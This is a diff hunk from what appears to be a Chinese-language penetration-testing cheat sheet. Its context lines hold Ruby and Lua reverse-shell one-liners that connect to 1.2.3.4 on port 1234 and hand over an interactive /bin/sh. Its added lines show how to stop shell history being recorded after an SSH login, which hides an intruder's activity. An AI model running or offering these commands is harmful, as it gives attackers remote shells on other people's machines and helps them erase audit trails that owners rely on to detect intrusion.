@@ -35,3 +35,8 @@ $ ruby -rsocket -e'f=TCPSocket.open("1.2.3.4",1234).to_i;exec sprintf("/bin/sh -
 ``` sh
 $ lua -e "require('socket');require('os');t=socket.tcp();t:connect('1.2.3.4','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
+
+### 登录SSH后不记录History
+``` sh
+$ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+```
